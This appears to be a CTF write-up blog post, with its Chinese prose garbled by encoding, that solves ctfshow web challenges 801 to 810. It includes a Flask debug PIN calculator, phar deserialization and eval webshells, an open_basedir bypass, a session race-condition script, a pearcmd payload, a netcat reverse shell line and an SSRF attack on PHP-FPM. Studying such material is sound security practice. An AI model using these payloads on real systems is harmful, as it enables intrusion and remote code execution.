---
title: ctfshow å¸¸è§å§¿åŠ¿
date: 2024-10-21 21:52:39
permalink: /pages/a43171/
author: 
  name: Cola
  link: https://the0n3.top
---
# ctfshow å¸¸è§å§¿åŠ¿

## web801

flask pinå€¼è®¡ç®—ï¼Œè¯»å–æ–‡ä»¶ï¼Œè„šæœ¬è®¡ç®—pinç ã€‚æ¢­å“ˆ

éé¢„æœŸï¼š`url/file?filename=/flag`

é¢„æœŸï¼š

```python
import hashlib
from itertools import chain

probably_public_bits = [
    'root'  # usernameï¼Œé€šè¿‡/etc/passwd
    'flask.app',  # modnameï¼Œé»˜è®¤å€¼
    'Flask',  # é»˜è®¤å€¼
    '/usr/local/lib/python3.8/site-packages/flask/app.py' # moddirï¼Œé€šè¿‡æŠ¥é”™è·å¾—
]
# å¡«å…¥è·å–çš„16è¿›åˆ¶å³å¯ï¼Œåé¢æ·»åŠ äº†è½¬æ¢åŠŸèƒ½
address = '02:42:ac:0c:e8:a0'
address = int(address.replace(':', ''),16)
private_bits = [
    f'{address}',  # macåè¿›åˆ¶å€¼ /sys/class/net/eth0/address
    '225374fa-04bc-4346-9f39-48fa82829ca934b345d280f694439fa54c01aa968eef81f55a7e5baa3e39db57884e39217606'  # çœ‹ä¸Šé¢machine-idéƒ¨åˆ†
]

# ä¸‹é¢ä¸ºæºç é‡Œé¢æŠ„çš„ï¼Œä¸éœ€è¦ä¿®æ”¹
h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
        else:
            rv = num

print(rv)

# ä¸‹é¢ä¸ºæºç é‡Œé¢æŠ„çš„ï¼Œä¸éœ€è¦ä¿®æ”¹
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

![1](https://the0n3.top/medias/show800/1.png)


## web802

é™åˆ¶éå­—æ¯æ•°å­—ï¼Œå¯ä»¥ç”¨å­—ç¬¦ï¼Œè‡ªå¢æ„é€ å­—ç¬¦

æ„é€ `$_GET[_]($_GET[__])`

```php
<?php
$___=((''/'').'')[''==_];# $___ = N
$____=((''/'').'')[''==''];# $____ = A
++$____;
++$____;
++$____;
$_____=++$____; # $_____ = E

++$____;
++$____;
$______ = $____; # $______ = G

++$___;++$___;++$___;++$___;++$___;
$_______=++$___; # $______ = T# 

$________='_'.$______.$_____.$_______;
$$________[_]($$________[__]); # $_GET[_]($_GET[__])
```

ç®€åŒ–

```php
$___=((''/'').'')[''==_];$____=((''/'').'')[''==''];++$____;++$____;++$____;$_____=++$____;++$____;++$____;$______ = $____;++$___;++$___;++$___;++$___;++$___;$_______=++$___;$________='_'.$______.$_____.$_______;$$________[_]($$________[__]);
```

æ•´ä¸ªpayloadä½¿ç”¨postå‘åŒ…ï¼Œurlç¼–ç ä¸€ä¸‹ï¼Œé¿å…`$`,`=`å…·æœ‰ç‰¹æ®Šè¯­æ„

![2](https://the0n3.top/medias/show800/2.png)

## web803

pharæ–‡ä»¶åŒ…å«ï¼Œç¬¬ä¸€æ¬¡æ¥è§¦ï¼Œåç»­è¯¦ç»†å­¦ä¹ ä¸€ä¸‹

è¿™é‡Œå®¡è®¡èµ·æ¥æœ‰ç‚¹å¥‡æ€ªï¼Œä¸å­˜åœ¨`$file.txt`å°±å†™ä¸€ä¸ª`$file`ï¼Œå†™äº†`$file`é‚£`$file.txt`ä¸è¿˜æ˜¯ä¸å­˜åœ¨ï¼Ÿé€šè¿‡`file_put_contents`å‡½æ•°ç›´æ¥å†™ğŸä¸ç°å®äº†ï¼Œå¯ä»¥äº†è§£åˆ°è¿™é‡Œå¯ä»¥é€šè¿‡pharæ‰“åŒ…ä¸€ä¸ª`$file.txt`åˆ°æœåŠ¡å™¨ï¼Œä½¿æ–‡ä»¶åŒ…å«æˆä¸ºäº†å¯èƒ½

```php
if(isset($content) && !preg_match('/php|data|ftp/i',$file)){
    if(file_exists($file.'.txt')){
        include $file.'.txt';
    }else{
        file_put_contents($file,$content);
    }
}
```

ç”Ÿæˆpharæ–‡ä»¶ï¼Œé‡Œé¢æ‰“åŒ…ä¸€ä¸ª`a.txt`ï¼Œå†…å®¹ä¸º`<?php highlight_file(__FILE__);eval($_POST[1]);?>`

```php
<?php
$phar = new Phar("shell.phar");
$phar->startBuffering();
$phar -> setStub('GIF89a'.'<?php __HALT_COMPILER();?>');
$phar->addFromString("a.txt", "<?php highlight_file(__FILE__);eval(\$_POST[1]);?>");
$phar->stopBuffering();
?>
```

ä½¿ç”¨pythonå‘åŒ…

```python
import requests

url="http://7fce7e3d-4206-4f91-b196-7536bde12046.challenge.ctf.show/"

data1={'file':'/tmp/a.phar','content':open('shell.phar','rb').read()}
r = requests.post(url,data=data1)
print(r.text)
```

é€šè¿‡pharåè®®åŒ…å«æ–‡ä»¶

![3](https://the0n3.top/medias/show800/3.png)

## web804

unlinkä¼šè§¦å‘ååºåˆ—åŒ–

```php
class hacker{
    public $code;
    public function __destruct(){
        eval($this->code);
    }
}

$file = $_POST['file'];
$content = $_POST['content'];

if(isset($content) && !preg_match('/php|data|ftp/i',$file)){
    if(file_exists($file)){
        unlink($file);
    }else{
        file_put_contents($file,$content);
    }
}
```

é‡ç‚¹åœ¨`hacker`ç±»ææ„å‡½æ•°å­˜åœ¨å‘½ä»¤æ‰§è¡Œ

```php
<?php 
class hacker{
    public $code = 'system("tac /f*;tac f*");';
}
$a=new hacker();
$phar = new Phar("shell.phar");
$phar->startBuffering();
$phar->setMetadata($a);
$phar -> setStub('GIF89a'.'<?php __HALT_COMPILER();?>');
$phar->addFromString("a.txt", "111");
$phar->stopBuffering();
?>
```

pythonå‘åŒ…

```python
import requests

url="http://4d03da6f-da2a-4b1e-beb3-b1ad422e3af6.challenge.ctf.show/"

data1={'file':'/tmp/aa.phar','content':open('shell.phar','rb').read()}
r = requests.post(url,data=data1)
print(r.text)
```

![4](https://the0n3.top/medias/show800/4.png)


## web805

é€šè¿‡phpinfo()å‡½æ•°å›æ˜¾çœ‹åˆ°é™å®šäº†ç›®å½•ï¼Œç¦ç”¨äº†ç³»ç»Ÿå‘½ä»¤å‡½æ•°

```plaintext
open_basedir	/var/www/html
disable_classes	SoapClient,mysqli,mysql,pdo,phar
disable_functions	system,exec,shell_exec,passthru,popen,fopen,popen,pcntl_exe	
```

å‚è€ƒæ–‡ç« [open_basedirç»•è¿‡](https://www.v0n.top/2020/07/10/open_basedir%E7%BB%95%E8%BF%87/)

å­¦ä¹ åˆ°ä¸€äº›å§¿åŠ¿

é€šè¿‡glob://åè®®å’ŒåŸç”Ÿç±»æ­é…åˆ©ç”¨ï¼Œå¯ä»¥åˆ—å‡ºæ ¹ç›®å½•æ–‡ä»¶

![5](https://the0n3.top/medias/show800/5.png)

```php
1=$it = new DirectoryIterator("glob:///*");
foreach($it as $f) {
    printf($f->getFilename()."  ");
}
```

å°è¯•ä½¿ç”¨åŸç”Ÿç±»è¯»å–ï¼Œå¤±è´¥äº†ã€‚çœ‹äº†å•æ˜¯åŸç”Ÿç±»ç»•ä¸è¿‡å»

```php
$f = new SplFileObject("php://filter/convert.base64-encode/resource=/ctfshowflag");
echo $f->fread($f->getSize());
```

scandir()å‡½æ•°æ­é…glob://åè®®ï¼Œä¹Ÿå¯ä»¥åˆ—å‡ºæ ¹ç›®å½•æ–‡ä»¶

```php
var_dump(scandir('glob:///*'));
```

ä¸€ä¸ªç»•è¿‡æ€è·¯

åœ¨å½“å‰æ–‡ä»¶å¤¹`/var/www/html`é‡Œå»ºç«‹äº†å­æ–‡ä»¶å¤¹`test`ï¼Œè¿›å…¥äº†å­æ–‡ä»¶å¤¹testï¼Œåˆ©ç”¨ini_setå‡½æ•°ï¼ŒæŠŠ`/var/www/html`ä¸‹çš„å­ç›®å½•testä¸‹ï¼Œä½¿ç”¨ini_setå‡½æ•°è®¾ç½®`..`ä¸Šä¸€çº§ç›®å½•ï¼Œä¹Ÿå°±æ˜¯`/var/www/html`ç›®å½•

æˆ‘çš„æ€è€ƒï¼šè¿™é‡Œçš„`..`å­˜åœ¨åŒé‡å«ä¹‰

- /var/www/html
- ..

å› æ­¤ï¼Œäº§ç”Ÿäº†ç›®å½•ç©¿è¶Šçš„åˆ©ç”¨ç‚¹ï¼Œé€šè¿‡chdirå‡½æ•°ä¸€ç›´åˆ‡åˆ°äº†æ ¹ç›®å½•ï¼Œæœ€åæŠŠopen_basedirè®¾ç½®åœ¨äº†æ ¹ç›®å½•ï¼Œä½¿highlight_fileå‡½æ•°è¯»å–äº†flagæˆäº†å¯èƒ½

```php
mkdir('test');
chdir('test');
var_dump(ini_set('open_basedir','..'));
chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');
var_dump(ini_set('open_basedir','/'));
highlight_file('ctfshowflag');
```

## web806

phpæ— å‚RCE

åªèƒ½ä½¿ç”¨æ— å‚å‡½æ•°

```php
if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {    
    eval($_GET['code']);
}
```

å¥½åœ¨åœ¨ctfshowå‘½ä»¤æ‰§è¡Œé¢˜å•ä¸­è®°å½•äº†ä¸€ä¸‹payloadï¼Œè·å–æœ€åä¸€ä¸ªå®šä¹‰çš„å˜é‡å¹¶æ‰§è¡Œï¼Œç¨‹åºé‡Œæœ€åä¸€ä¸ªå®šä¹‰çš„æ— æ³•æ§åˆ¶ï¼Œå¯ä»¥åœ¨posté‡Œä¼ å…¥ä¸€ä¸ªæ¥æ‰§è¡Œ

```php
eval(array_pop(next(get_defined_vars())));
```

![6](https://the0n3.top/medias/show800/6.png)

## web807

é¢˜ç›®ä½¿ç”¨äº†`shell_exec`å‡½æ•°ï¼Œæƒ³å°è¯•å†™æ–‡ä»¶æ¥ç€ï¼Œå¥½åƒæ²¡æœ‰å†™ï¼Œåªèƒ½å¼¹ä¸ªshelläº†

```bash
https://baidu.com;nc ip port -e /bin/sh;
```

## web808

sessionæ–‡ä»¶åŒ…å«ï¼Œè„šæœ¬æ¡ä»¶ç«äº‰

![7](https://the0n3.top/medias/show800/7.png)

```php
import io
import requests
import threading
# å¦‚æœé¢˜ç›®é“¾æ¥æ˜¯httpsï¼Œæ¢æˆhttp
# url = 'https://85a94ccd-c8d7-40ac-ae8f-38ce8f7febb6.challenge.ctf.show/'
url = 'http://092d8949-e4c3-4d0b-8478-240a371fd53c.challenge.ctf.show/'
sessionid = 'ctfshow'

def write(session): # å†™å…¥ä¸´æ—¶æ–‡ä»¶
    while True:
        fileBytes = io.BytesIO(b'a'*1024*50) # 50kb
        session.post(url,
        cookies = {'PHPSESSID':sessionid},
        data = {'PHP_SESSION_UPLOAD_PROGRESS':'<?php file_put_contents("shell.php","<?php highlight_file(__FILE__);eval(\$_GET[1]);?>");?>'},
        files={'file':('1.jpg',fileBytes)}
        )

def read(session):
    while True:
        session.get(url + '?file=/tmp/sess_' + sessionid) # è¿›è¡Œæ–‡ä»¶åŒ…å«
        r = session.get(url+'shell.php') # æ£€æŸ¥æ˜¯å¦å†™å…¥ä¸€å¥è¯æœ¨é©¬
        if r.status_code == 200:
            print('OK')
            return ''

evnet=threading.Event() # å¤šçº¿ç¨‹

session = requests.session()
for i in range(5):
    threading.Thread(target = write,args = (session,)).start()
for i in range(5):
    threading.Thread(target = read,args = (session,)).start()

evnet.set()
```

## web809

è¿‡æ»¤çš„ä¸å¤Ÿä¸¥æ ¼ï¼Œä¸Šä¸€é¢˜çš„è„šæœ¬ä»ç„¶å¯ä»¥è·‘

![8](https://the0n3.top/medias/show800/8.png)

å­¦ä¹ ä¸‹é¢˜ç›®çš„é¢„æœŸè€ƒå¯ŸçŸ¥è¯†`pear`ï¼Œå¾ˆæ–°å¥‡ï¼Œç¬¬ä¸€æ¬¡ç¢°åˆ°

å¼•å…¥**Pç‰›**å¸ˆå‚…åŸè¯

::: tip
peclæ˜¯PHPä¸­ç”¨äºç®¡ç†æ‰©å±•è€Œä½¿ç”¨çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œè€Œpearæ˜¯peclä¾èµ–çš„ç±»åº“ã€‚åœ¨7.3åŠä»¥å‰ï¼Œpecl/pearæ˜¯é»˜è®¤å®‰è£…çš„ï¼›åœ¨7.4åŠä»¥åï¼Œéœ€è¦æˆ‘ä»¬åœ¨ç¼–è¯‘PHPçš„æ—¶å€™æŒ‡å®š--with-pearæ‰ä¼šå®‰è£…ã€‚
:::

åŸæœ¬pear/pcelæ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œå¹¶ä¸åœ¨Webç›®å½•ä¸‹ï¼Œå³ä½¿å­˜åœ¨ä¸€äº›å®‰å…¨éšæ‚£ä¹Ÿæ— éœ€æ‹…å¿ƒã€‚ä½†æˆ‘ä»¬é‡åˆ°çš„åœºæ™¯æ¯”è¾ƒç‰¹æ®Šï¼Œæ˜¯ä¸€ä¸ªæ–‡ä»¶åŒ…å«çš„åœºæ™¯ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åŒ…å«åˆ°pearä¸­çš„æ–‡ä»¶ï¼Œè¿›è€Œåˆ©ç”¨å…¶ä¸­çš„ç‰¹æ€§æ¥æäº‹

å…ˆåŒ…å«`pear`æ–‡ä»¶ï¼Œåˆ©ç”¨phpçš„å‘½ä»¤è¡Œå‚æ•°`config-create`å†™æ–‡ä»¶ï¼Œæ‰€ä»¥payloadï¼š

payloadé‡Œå­˜åœ¨`&`,`+`ç­‰ç‰¹æ®Šå­—ç¬¦ï¼Œç›´æ¥ä½¿ç”¨hackbarå‘åŒ…ä¼šè¢«ç¼–ç å¤±å»åŸæ„ï¼Œå¯¼è‡´æ‰§è¡Œå¤±è´¥ï¼Œæ‰€ä»¥è¦ä½¿ç”¨bpå‘åŒ…

```php
?file=/usr/local/lib/php/pearcmd.php&+config-create+/<?=highlight_file(__FILE__);eval($_POST[1]);?>+/tmp/11
```

å¤©é©¬è¡Œç©º

![9](https://the0n3.top/medias/show800/9.png)

## web810

SSRFæ‰“PHP-FPM

é¡¹ç›®åœ°å€https://github.com/tarunkant/Gopherusï¼Œå·¥å…·ä¸‹è½½åœ°å€ï¼šhttps://github.com/tarunkant/Gopherus/archive/refs/heads/master.zip

```bash
mkdir web810
cd web810
wget https://github.com/tarunkant/Gopherus/archive/refs/heads/master.zip
unzip master.zip
cd Gopherus-master
python2 gopherus.py --exploit fastcgi
```
æ‹¿åˆ°çš„payloadï¼Œåœ¨`gopher://127.0.0.1:9000/`åçš„å†…å®¹è¿˜éœ€è¦å†urlç¼–ç ä¸€ä¸‹

![10](https://the0n3.top/medias/show800/10.png)

![11](https://the0n3.top/medias/show800/11.png)


å‚è€ƒã€è‡´è°¢ï¼š

- [open_basedirç»•è¿‡](https://www.v0n.top/2020/07/10/open_basedir%E7%BB%95%E8%BF%87/)